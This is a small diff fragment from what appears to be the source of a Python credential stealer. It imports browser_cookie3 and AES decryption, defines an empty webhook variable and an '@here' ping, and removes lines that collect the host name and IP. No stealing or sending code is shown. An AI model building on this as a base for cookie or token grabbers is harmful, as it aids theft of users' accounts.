@@ -23,9 +23,6 @@ import browser_cookie3
 from Crypto.Cipher import AES
 import ctypes
 
-host = socket.gethostname()
-ip = socket.gethostbyname(host)
-
 types = "@here"
 h00k = ""
 
